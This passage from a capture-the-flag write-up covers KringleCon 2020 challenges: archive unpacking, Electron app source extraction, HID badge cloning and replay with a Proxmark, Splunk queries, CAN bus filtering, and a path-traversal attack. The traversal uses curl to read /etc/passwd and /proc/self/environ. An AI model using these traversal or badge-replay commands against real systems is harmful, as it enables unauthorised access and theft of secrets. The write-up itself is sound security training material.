<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ mv package.out package.zip
elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ unzip package.zip
Archive:  package.zip
 extracting: package.txt.Z.xz.xxd.tar.bz2
</code></pre></div><p>That zip contains a&hellip; confusing file with lots of extensions! Let&rsquo;s tackle the last one, the  bzip2 archive with the <code>.tar.bz2</code> extensions.</p>
<blockquote>
<p>bzip2  compresses files using the Burrows-Wheeler block sorting text compression algorithm, and Huffman cod‐
ing.  Compression is generally considerably better than that achieved by more  conventional  LZ77/LZ78-based
compressors, and approaches the performance of the PPM family of statistical compressors.</p>
<p>~~ man bzip2</p>
</blockquote>
<p>The linux archive command <code>tar</code> can automatically decompress and extract bzip2 files:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ file package.txt.Z.xz.xxd.tar.bz2
package.txt.Z.xz.xxd.tar.bz2: bzip2 compressed data, block size = 900k
elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ tar xf package.txt.Z.xz.xxd.tar.bz2
</code></pre></div><p>Next we have a hexdump made with the <code>xxd</code> command:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ file package.txt.Z.xz.xxd
package.txt.Z.xz.xxd: ASCII text
elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ head package.txt.Z.xz.xxd
00000000: fd37 7a58 5a00 0004 e6d6 b446 0200 2101  .7zXZ......F..!.
00000010: 1600 0000 742f e5a3 0100 2c1f 9d90 4ede  ....t/....,...N.
00000020: c8a1 8306 0494 376c cae8 0041 054d 1910  ......7l...A.M..
00000030: 46e4 bc99 4327 4d19 8a06 d984 19f3 f08d  F...C&#39;M.........
00000040: 1b10 45c2 0c44 a300 0000 0000 c929 dad6  ..E..D.......)..
00000050: 64ef da24 0001 452d 1e52 57e8 1fb6 f37d  d..$..E-.RW....}
00000060: 0100 0000 0004 595a                      ......YZ
</code></pre></div><p><code>xxd</code>  has a <code>-r</code> option to do the opposite operation and turn the hexdump back into a file:</p>
<div class="highlight"><pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">elf</span><span class="err">@</span><span class="mf">5e5813</span><span class="nx">d4a97c</span><span class="p">:</span><span class="err">~</span><span class="o">/</span><span class="nx">bucket_finder</span><span class="o">/</span><span class="nx">wrapper3000</span><span class="err">$</span> <span class="nx">xxd</span> <span class="o">-</span><span class="nx">r</span> <span class="kn">package</span><span class="p">.</span><span class="nx">txt</span><span class="p">.</span><span class="nx">Z</span><span class="p">.</span><span class="nx">xz</span><span class="p">.</span><span class="nx">xxd</span> <span class="kn">package</span><span class="p">.</span><span class="nx">txt</span><span class="p">.</span><span class="nx">Z</span><span class="p">.</span><span class="nx">xz</span>
<span class="nx">elf</span><span class="err">@</span><span class="mf">5e5813</span><span class="nx">d4a97c</span><span class="p">:</span><span class="err">~</span><span class="o">/</span><span class="nx">bucket_finder</span><span class="o">/</span><span class="nx">wrapper3000</span><span class="err">$</span> <span class="nx">ls</span>
<span class="kn">package</span>           <span class="kn">package</span><span class="p">.</span><span class="nx">txt</span><span class="p">.</span><span class="nx">Z</span><span class="p">.</span><span class="nx">xz</span><span class="p">.</span><span class="nx">xxd</span>          <span class="kn">package</span><span class="p">.</span><span class="nx">zip</span>
<span class="kn">package</span><span class="p">.</span><span class="nx">txt</span><span class="p">.</span><span class="nx">Z</span><span class="p">.</span><span class="nx">xz</span>  <span class="kn">package</span><span class="p">.</span><span class="nx">txt</span><span class="p">.</span><span class="nx">Z</span><span class="p">.</span><span class="nx">xz</span><span class="p">.</span><span class="nx">xxd</span><span class="p">.</span><span class="nx">tar</span><span class="p">.</span><span class="nx">bz2</span>

</code></pre></div><p>Next, we have XZ compressed data, which can be uncompressed in-place with <code>unxz</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ file package.txt.Z.xz
package.txt.Z.xz: XZ compressed data
elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ unxz package.txt.Z.xz
</code></pre></div><p>Then something I&rsquo;ve never seen before, Z file compression:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ file package.txt.Z
package.txt.Z: compress&#39;d data 16 bits
</code></pre></div><blockquote>
<p>compress is a Unix shell compression program based on the LZW compression algorithm. [&hellip;] Files compressed by compress are typically given the extension &ldquo;.Z&rdquo; [&hellip;] Files can be returned to their original state using uncompress.</p>
<p><a href="https://en.wikipedia.org/wiki/Compress">https://en.wikipedia.org/wiki/Compress</a></p>
</blockquote>
<p>One more uncompress before package.txt?</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ uncompress package.txt.Z
elf@5e5813d4a97c:~/bucket_finder/wrapper3000$ cat package.txt
North Pole: The Frostiest Place on Earth
</code></pre></div><p>Answer: <code>North Pole: The Frostiest Place on Earth</code></p>
<h2 id="3-point-of-sale-password-recovery-">3. Point-of-Sale Password Recovery 🎄</h2>
<p>Description:</p>
<blockquote>
<p>Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What&rsquo;s the password?</p>
</blockquote>
<p>Hints:</p>
<blockquote>
<p>Electron Applications
From: Sugarplum Mary
It&rsquo;s possible to extract the source code from an <a href="https://www.electronjs.org/">Electron</a> app.</p>
</blockquote>
<blockquote>
<p>Electron ASAR Extraction
From: Sugarplum Mary
There are <a href="https://www.npmjs.com/package/asar">tools</a> and <a href="https://medium.com/how-to-electron/how-to-get-source-code-of-any-electron-application-cbb5c7726c37">guides</a> explaining how to extract ASAR from Electron apps.</p>
</blockquote>
<h3 id="solution-4">Solution</h3>
<p>So&hellip; unfortunately, <code>santa-shop</code> is a Windows executable:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ file santa-shop.exe
santa-shop.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
</code></pre></div><p>Can the <code>asar</code> node module extract directly from the installer?</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ npm install asar
$ asar extract santa-shop.exe src
node:internal/buffer:82
    throw new ERR_BUFFER_OUT_OF_BOUNDS();
    ^

RangeError [ERR_BUFFER_OUT_OF_BOUNDS]: Attempt to access memory outside buffer bounds
    at new NodeError (node:internal/errors:278:15)
    at boundsError (node:internal/buffer:82:11)
    at Buffer.readUInt32LE (node:internal/buffer:218:5)
    at Pickle.getPayloadSize
[..]
</code></pre></div><p>That probably means no, the <code>.asar</code> file is required, not the <code>.exe</code> installer :( Using a <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/">Windows VM</a>, install <code>santa-shop</code> in it.</p>
<p>We need the actual <code>.asar</code> file, not the <code>.exe</code> installer! I guess we have no other choice: let&rsquo;s spin up a Windows VM and install santa-shop in it. The app will be installed in <code>C:\Users\User\AppData\Local\Programs\santa-shop</code>. More specifically, the <code>app.asar</code> will be in <code>C:\Users\User\AppData\Local\Programs\santa-shop\resources</code>. Grabbing the <code>app.asar</code> back from Linux, we can try the <code>extract</code> step again, this time, without errors:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ asar extract app.asar src
$ tree src
src
├── img
│   ├── network1.png
│   ├── network2.png
│   ├── network3.png
│   └── network4.png
├── index.html
├── main.js
├── package.json
├── preload.js
├── README.md
├── renderer.js
└── style.css
</code></pre></div><p>The README gives us a hint to look at the top of <code>main.js</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">$</span> <span class="nx">head</span> <span class="nx">main</span><span class="p">.</span><span class="nx">js</span>
<span class="c1">// Modules to control application life and create native browser window
</span><span class="c1"></span><span class="kr">const</span> <span class="p">{</span> <span class="nx">app</span><span class="p">,</span> <span class="nx">BrowserWindow</span><span class="p">,</span> <span class="nx">ipcMain</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;electron&#39;</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>

<span class="kr">const</span> <span class="nx">SANTA_PASSWORD</span> <span class="o">=</span> <span class="s1">&#39;santapass&#39;</span><span class="p">;</span>
<span class="p">...</span>
</code></pre></div><p>Answer: <code>santapass</code> (note: I know you very much want to input that password directly into Santa PoS, but remember that it&rsquo;s in the objective menu actually&hellip;)</p>
<h2 id="4-operate-the-santavator-">4. Operate the Santavator 🎄🎄</h2>
<p>Description:</p>
<blockquote>
<p>Talk to Pepper Minstix in the entryway to get some hints about the Santavator.</p>
</blockquote>
<p>Hint:</p>
<blockquote>
<p>From: Pepper Minstix
It&rsquo;s really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel.</p>
</blockquote>
<h3 id="solution-5">Solution</h3>
<p>Solving this one requires to find a bunch of items on the map, as a general rule if something is on the floor, just click on it :D</p>
<ol>
<li>the green light-bulb (top left corner of the courtyard) will give access to the talks lobby</li>
<li>the red light-bulb (talks lobby) and the workshop button for the elevator (in the speaker room after you solve the terminal speaker UNprep) are needed for the workshop and the roof</li>
<li>the yellow light-bulb is in the netwars room on the roof. Very important detail: you CANNOT find the light-bulb if you&rsquo;re Santa. (ask me how I know)</li>
</ol>
<p>Then move all the stuff around so that the 3 light-bulbs are lighted, for example:</p>
<p><img src="img/image-20210101203231794.png" alt="image-20210101203231794"></p>
<p>Side-note: you can also make objects appear out of thin air by modifying the token list in the URL from the iframe in the source code (try <code>marble2</code> for example).</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">https://elevator.kringlecastle.com/?challenge=elevatorr&amp;id=4a5f1e96-ca01-4977-aa6f-e34af43444c3&amp;username=kylma&amp;area=santavator5&amp;location=1,2&amp;tokens=marble,nut2,nut,candycane,ball,elevator-key,greenlight,redlight,workshop-button,yellowlight
</code></pre></div><h2 id="5-open-hid-lock-">5. Open HID Lock 🎄🎄</h2>
<p>Description:</p>
<blockquote>
<p>Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips.</p>
</blockquote>
<p>Hints:</p>
<blockquote>
<p>What&rsquo;s a Proxmark?
From: Bushy Evergreen
The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events.</p>
</blockquote>
<blockquote>
<p>Reading Badges with Proxmark
From: Bushy Evergreen
You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running <code>lf hid read</code> when you are close enough to someone with a badge.</p>
</blockquote>
<blockquote>
<p>Impersonating Badges with Proxmark
From: Bush Evergreen
You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. <code>lf hid sim -r 2006......</code></p>
</blockquote>
<blockquote>
<p>Short List of Essential Proxmark Commands
From: Bushy Evergreen
There&rsquo;s a <a href="https://gist.github.com/joswr1ght/efdb669d2f3feb018a22650ddc01f5f2">short list of essential Proxmark commands</a> also available.</p>
</blockquote>
<blockquote>
<p>Proxmark Talk
From: Bushy Evergreen
Larry Pesce knows a thing or two about <a href="https://www.youtube.com/watch?v=647U85Phxgo">HID attacks</a>. He&rsquo;s the author of a course on wireless hacking!</p>
</blockquote>
<h3 id="solution-6">Solution</h3>
<p>The proxmark itself can be found in the wrapping room, on the workshop floor. Open the proxmark CLI from your item inventory. The <code>lf hid read</code> command scans for low frequency (125 kHz) HID prox cards. Using this command near Noel Boetie:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[magicdust] pm3 --&gt; lf hid read
#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020
</code></pre></div><p>His badge can now be simulated with the <code>sim</code> subcommand. Example usage from the help:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">lf hid sim -w H10301 --fc 118 --cn 1603      -&gt; HID 10301 26 bit
</code></pre></div><p>The following informations are required:</p>
<ul>
<li>the wiegand format for the <code>-w</code> option</li>
<li>the facility code for the <code>--fc</code> option</li>
<li>the card number for the <code>--cn</code> option</li>
</ul>
<p>The last two options are in the output of <code>lf hid read</code>.  For the Wiegand format,  there&rsquo;s only one option with a format length of 26-bit in the output of  <code>wiegand list</code>: <code>HID H10301 26-bit</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[magicdust] pm3 --&gt; wiegand list
Name       Description
------------------------------------------------------------
H10301     HID H10301 26-bit
Tecom27    Tecom 27-bit
[...]
</code></pre></div><p>Putting everything together gives:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">lf hid sim -w H10301 --fc 113 --cn 6020
</code></pre></div><p>And running it in the proxmark CLI, near the HID lock:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[magicdust] pm3 --&gt; lf hid sim -w H10301 --fc 113 --cn 6020
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6020    parity: valid
[=] Stopping simulation after 10 seconds.
[=] Done
</code></pre></div><p>And&hellip;. Nothing happens! Probably because it was the wrong elf. Let&rsquo;s hunt, I mean, look for other elves :&lsquo;DD</p>
<table>
<thead>
<tr>
<th>Elf</th>
<th>lf hid read results</th>
</tr>
</thead>
<tbody>
<tr>
<td>Shiny Upatree</td>
<td>#db# TAG ID: 2006e22f13 (6025) - Format Len: 26 bit - FC: 113 - Card: 6025</td>
</tr>
<tr>
<td>Noel Boetie</td>
<td>#db# TAG ID: 2006e22f08 (6020) - Format Len: 26 bit - FC: 113 - Card: 6020</td>
</tr>
</tbody>
</table>
<p>AHAH. I found him! It was Shiny Upatree&rsquo;s badge you need to replay next to the lock!</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">[magicdust] pm3 --&gt; lf hid sim -w H10301 --fc 113 --cn 6025
[=] Simulating HID tag
[+] [H10301] - HID H10301 26-bit;  FC: 113  CN: 6025    parity: valid
[=] Stopping simulation after 10 seconds.
[=] Done
</code></pre></div><h2 id="6-splunk-challenge-">6. Splunk Challenge 🎄🎄🎄</h2>
<p>Description:</p>
<blockquote>
<p>Access the Splunk terminal in the Great Room. What is the name of the adversary group that Santa feared would attack KringleCon?</p>
</blockquote>
<p>Hints:</p>
<blockquote>
<p>Data Decoding and Investigation
From: Minty Candycane
Defenders often need to manipulate data to decRypt, deCode, and refourm it into something that is useful. Cyber Chef is extremely useful here!</p>
</blockquote>
<blockquote>
<p>Adversary Emulation and Splunk
From: Minty Candycane
Dave Herrald talks about emulating advanced adversaries and <a href="https://www.youtube.com/watch?v=RxVgEFt08kU">hunting them with Splunk</a>.</p>
</blockquote>
<blockquote>
<p>Splunk Basics
From: Minty Candycane
There was a great <a href="https://www.youtube.com/watch?v=qbIhHhRKQCw">Splunk talk</a> at KringleCon 2 that&rsquo;s still available!</p>
</blockquote>
<p>Clicking on the Splunk terminal teleports us to <a href="https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc,">https://splunk.kringlecastle.com/en-US/app/SA-kringleconsoc/kringleconsoc,</a> which lists the challenge question and the first training question.</p>
<blockquote>
<p>Challenge Question
What is the name of the adversary group that Santa feared would attack KringleCon?</p>
</blockquote>
<h3 id="training-question-1">Training Question 1</h3>
<blockquote>
<p>How many distinct MITRE ATT&amp;CK techniques did Alice emulate?</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230533090.png" alt="image-20201226230533090"></p>
<p>I used the query provided by the hint:  <code>| tstats count where index=* by index</code> and manually counted the results :&lsquo;D</p>
<p>Answer: <code>13</code></p>
<h3 id="training-question-2">Training Question 2</h3>
<p>Description:</p>
<blockquote>
<p>What are the names of the two indexes that contain the results of emulating Enterprise ATT&amp;CK technique 1059.003? (Put them in alphabetical order and separate them with a space)</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230608436.png" alt="image-20201226230608436"></p>
<p>The definition links to <a href="https://docs.splunk.com/Splexicon:Index">https://docs.splunk.com/Splexicon:Index</a></p>
<p>I modified the query from the first hint to filter on index whose name contain <code>1059.003</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">| tstats count where index=*1059.003* by index
</code></pre></div><p><img src="img/image-20210109215850294.png" alt="image-20210109215850294"></p>
<p>Answer: <code>t1059.003-main t1059.003-win</code></p>
<h3 id="training-question-3">Training Question 3</h3>
<p>Description:</p>
<blockquote>
<p>One technique that Santa had us simulate deals with &lsquo;system information discovery&rsquo;. What is the full name of the registry key that is queried to determine the MachineGuid?</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230717386.png" alt="image-20201226230717386"></p>
<p>Searching around on the <a href="https://github.com/redcanaryco/atomic-red-team/">Atomic Red Team repository</a> about MachineGuid, I found this link: <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-8---windows-machineguid-discovery</a></p>
<p><img src="img/image-20210109220213432.png" alt="image-20210109220213432"></p>
<p>Answer: <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography </code></p>
<h3 id="training-question-4">Training Question 4</h3>
<p>Description:</p>
<blockquote>
<p>According to events recorded by the Splunk Attack Range, when was the first OSTAP related atomic test executed? (Please provide the alphanumeric UTC timestamp.)</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230810239.png" alt="image-20201226230810239"></p>
<p>Add <code>ostap</code> to the search query: <code>index=attack ostap</code>, then order by Execution Time UTC:</p>
<p><img src="img/image-20201222225606952.png" alt="image-20201222225606952"></p>
<p>Answer: <code>2020-11-30T17:44:15Z</code></p>
<h3 id="training-question-5">Training Question 5</h3>
<p>Description:</p>
<blockquote>
<p>One Atomic Red Team test executed by the Attack Range makes use of an open source package authored by frgnca on GitHub. According to Sysmon (Event Code 1) events in Splunk, what was the ProcessId associated with the first use of this component?</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230832111.png" alt="image-20201226230832111"></p>
<p>I started by looking in the repository on frgnca&rsquo;s github and found <a href="https://github.com/frgnca/AudioDeviceCmdlets">https://github.com/frgnca/AudioDeviceCmdlets</a>.</p>
<p>Then I looked for AudioDeviceCmdlets in the atomic red team repository: <a href="https://github.com/akapv/atomic-red-team/blob/master/Windows/Collection/Audio_Capture.md">https://github.com/akapv/atomic-red-team/blob/master/Windows/Collection/Audio_Capture.md</a>.</p>
<p><img src="img/image-20210109221859473.png" alt="image-20210109221859473"></p>
<p>We know it&rsquo;s in index T1123 now and that the command line contains Audio. Adding these filters to the search query, as well as the <code>EventCode=1</code> from the training question:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">index=&#34;t1123-win&#34; EventCode=1 CommandLine=&#34;*Audio*&#34;
</code></pre></div><p>note: you might have to change the time range (right button of the search field) to <code>all time</code> to avoid missing events.</p>
<p>This query matches 2 events, which have PIDs <code>1664</code> and <code>3648</code>:</p>
<p>Trying both PIDs, we find that <code>3648</code> is the correct answer.</p>
<p>Answer: <code>3648</code></p>
<h3 id="training-question-6">Training Question 6</h3>
<p>Description:</p>
<blockquote>
<p>Alice ran a simulation of an attacker abusing Windows registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230856195.png" alt="image-20201226230856195"></p>
<p>Searching for <code>bat</code> and <code>atomic red team</code>  on the Internetz, this <code>Discovery.bat</code> script shows up:
<a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/src/Discovery.bat#L44">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1074.001/src/Discovery.bat#L44</a> and the final command of this bat file is <code>quser</code>.</p>
<p>Answer: <code>quser</code></p>
<h3 id="training-question-7">Training Question 7</h3>
<p>Description:</p>
<blockquote>
<p>According to x509 certificate events captured by Zeek (formerly Bro), what is the serial number of the TLS certificate assigned to the Windows domain controller in the attack range?</p>
</blockquote>
<p>Alice Bluebird:</p>
<p><img src="img/image-20201226230430677.png" alt="image-20201226230430677"></p>
<p>I used this search query to search for x509 certificates:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"> index=* sourcetype=*bro* sourcetype=&#34;bro:x509:json&#34;
</code></pre></div><p><img src="img/image-20201226225626431.png" alt="image-20201226225626431"></p>
<p>Answer: <code> 55FCEEBB21270D9249E86F4B9DC7AA60</code></p>
<h3 id="challenge-question">Challenge Question</h3>
<p><img src="img/image-20201226230043327.png" alt="image-20201226230043327"></p>
<p>The ciphertext is base64 encoded: <code>7FXjP1lyfKbyDK/MChyf36h7</code></p>
<p>The title of <a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a> is <code>Prohibiting RC4 Cipher Suites</code>, so the algorithm is probably RC4. The key is in the associated talk <a href="https://youtu.be/RxVgEFt08kU?t=1116">Adversary Emulation and Automation</a>, <code>Stay Frosty</code></p>
<p>Using Cyberchef to decode all of this:</p>
<p><img src="img/image-20201226230350339.png" alt="image-20201226230350339"></p>
<p>Answer: <code>The Lollipop Guild</code></p>
<h2 id="7-solve-the-sleighs-can-d-bus-problem-">7. Solve the Sleigh&rsquo;s CAN-D-BUS Problem 🎄🎄🎄</h2>
<p>Description:</p>
<blockquote>
<p>Jack Frost is somehow inserting malicious messages onto the sleigh&rsquo;s CAN-D bus. We need you to exclude the malicious messages and no others to fix the sleigh. Visit the NetWars room on the roof and talk to Wunorse Openslae for hints.</p>
</blockquote>
<p>Wunorse Openslae</p>
<blockquote>
<p>Hey Santa!
Those tweaks you made to the sled just don’t seem right to me.
I can’t figure out what’s wrong, but maybe you can check it out to fix it.</p>
</blockquote>
<h3 id="solution-7">Solution</h3>
<p>Each CAN message is composed of a 11-bit CAN ID and a 8 bytes maximum data payload.</p>
<p>Remove all the noise by setting a filter to <code>all</code> for every CAN IDs except one, so we can analyze them one by one. Example for 244, you would have the filters: <code>019 All</code>, <code>188 All</code>, <code>080 All</code>, <code>19B All</code>.</p>
<p><img src="img/image-20201227123756846.png" alt="image-20201227123756846"></p>
<p>We can deduce which CAN IDs does what by clicking on the various buttons and seeing which CAN IDs output changes:</p>
<table>
<thead>
<tr>
<th>CAN IDs</th>
<th>NAME</th>
<th>Periodical updates?</th>
</tr>
</thead>
<tbody>
<tr>
<td>244</td>
<td>engine/accelerator</td>
<td>yes, RPM updates</td>
</tr>
<tr>
<td>019</td>
<td>steering</td>
<td>yes</td>
</tr>
<tr>
<td>080</td>
<td>brakes</td>
<td>yes</td>
</tr>
<tr>
<td>02A</td>
<td>ignition</td>
<td>no, 00FF00 = ON, 0000FF = OFF</td>
</tr>
<tr>
<td>19B</td>
<td>key</td>
<td>no, 000000000000 for LOCK, 00000F000000 for UNLOCK</td>
</tr>
</tbody>
</table>
<p>We are left with 2 unknown CAN IDs, which don&rsquo;t match anything on the Sleigh:</p>
<ul>
<li><code>19B#0000000F2057</code>  (corresponding filter: <code>19B Contains 0F2057</code>)</li>
<li><code>188#00000000</code> (corresponding filter: <code>188 Equals 000000000000</code>)</li>
</ul>
<p>And there&rsquo;s one more weird thing with the sleight&hellip; If you take a look at the output for CAN ID 080, which is the brakes, it seems to be sending two messages for the same update:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">1609068408301 080#000032
1609068408302 080#FFFFFA
1609068408917 080#000032
1609068408918 080#FFFFF3
1609068409225 080#000032
1609068409279 080#FFFFFA
1609068409837 080#000032
1609068409838 080#FFFFF8
</code></pre></div><p>I originally had 3 rules implemented : 2 for excluding the unknown CAN IDs and one for the 0xFFFF messages of the brakes. I&rsquo;m not quite sure why 188 is a valid message, but it needs to be allowed for the sleigh to be defrosted.</p>
<p>Final rules:</p>
<ul>
<li><code>080 Contains FFFF</code></li>
<li><code>19B Contains 0F2057</code></li>
</ul>
<p><img src="img/image-20201227123110409.png" alt="image-20201227123110409"></p>
<h2 id="8-broken-tag-generator-">8. Broken Tag Generator 🎄🎄🎄🎄</h2>
<p>Description</p>
<blockquote>
<p>Help Noel Boetie fix the <a href="https://tag-generator.kringlecastle.com/">Tag Generator</a> in the Wrapping Room. What value is in the environment variable GREETZ? Talk to Holly Evergreen in the kitchen for help with this.</p>
</blockquote>
<p>Holly Evergreen</p>
<blockquote>
<p>Hi Santa!
If you have a chance, I&rsquo;d love to get your feedback on the Tag Generator updates!
I&rsquo;m a little concerned about the file upload feature, but Noel thinks it will be fine.</p>
</blockquote>
<p>Noel Boetie</p>
<blockquote>
<p>Welcome to the Wrapping Room, Santa!
The tag generator is acting up.
I feel like the issue has something to do with weird files being uploaded.
Can you help me figure out what&rsquo;s wrong?</p>
</blockquote>
<h3 id="solution-8">Solution</h3>
<p><img src="img/image-20210102114851819.png" alt="image-20210102114851819"></p>
<p>We can upload image files and inspect the requests made with the developpers tools in Chrome:</p>
<ul>
<li>
<p>a POST request is made to upload the image:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">POST https://tag-generator.kringlecastle.com/upload
</code></pre></div></li>
<li>
<p>a GET request then retrieves the image just uploaded, and image name has been changed to some kind of unique ID:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">GET https://tag-generator.kringlecastle.com/image?id=fff1fd78-3356-4ebd-adc3-3eb9cbb4d569.png
</code></pre></div></li>
</ul>
<p>That URL retrieves a file on the filesystem&hellip; We could try a LFI attack, and see if we can get other files, like <code>/etc/passwd</code>:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ curl https://tag-generator.kringlecastle.com/image\?id\=../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
[...]
</code></pre></div><p>Neat, now we just need to find where to find the environment variables, something in <code>/proc</code> must probably be keeping track:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">curl https://tag-generator.kringlecastle.com/image\?id\=../../../../../../proc/self/environ
Warning: Binary output can mess up your terminal. Use &#34;--output -&#34; to tell
Warning: curl to output it to your terminal anyway, or consider &#34;--output
Warning: &lt;FILE&gt;&#34; to save to a file.
</code></pre></div><p>curl will complain, so just add the <code>--output - </code> as instructed:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">curl https://tag-generator.kringlecastle.com/image\?id\=../../../../../../proc/self/environ --output -
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app%
</code></pre></div><p>Answer: <code>JackFrostWasHere</code></p>
<h2 id="9-arp-shenanigans-">9. ARP Shenanigans 🎄🎄🎄🎄</h2>
<p>Objective description:</p>
<blockquote>
<p>Go to the NetWars room on the roof and help Alabaster Snowball get access back to a host using ARP. Retrieve the document at /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt. Who recused herself from the vote described on the document?</p>
</blockquote>
<p>Alabaster Snowball</p>
<blockquote>
<p>Oh, I see the Scapy Present Packet Prepper has already been completed!
Now you can help me get access to this machine.
It seems that some interloper here at the North Pole has taken control of the host
We need to regain access to some important documents associated with Kringle Castle
Maybe we should try a machine-in-the-middle attack?
That could give us access to manipulate DNS responses.
But we&rsquo;ll still need to cook up something to change the HTTP response.
I&rsquo;m sure glad you&rsquo;re here Santa.</p>
</blockquote>
<p>Hints:</p>
<blockquote>
<p>Sniffy
From: Alabaster Snowball
Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.</p>
</blockquote>
<blockquote>
<p>Spoofy
From: Alabaster Snowball
The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.</p>
</blockquote>
<blockquote>
<p>Resolvy
From: Alabaster Snowball
Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let&rsquo;s return a DNS response resolving the request to our IP.</p>
</blockquote>
<blockquote>
<p>Embedy
From: Alabaster Snowball
The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a <a href="http://www.wannescolman.be/?p=98">command in a customized .deb file</a></p>
</blockquote>
<p>Description:</p>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">Jack Frost has hijacked the host at 10.6.6.35 with some custom malware.
Help the North Pole by getting command line access back to this host.
Read the HELP.md file for information to help you in this endeavor.
Note: The terminal lifetime expires after 30 or more minutes so be
sure to copy off any essential work you have done as you go.
</code></pre></div><h3 id="solution-9">Solution</h3>
<h4 id="sniffy">Sniffy</h4>
<p>When running <code>tcpdump</code> on the  <code>eth0</code> interface:</p>
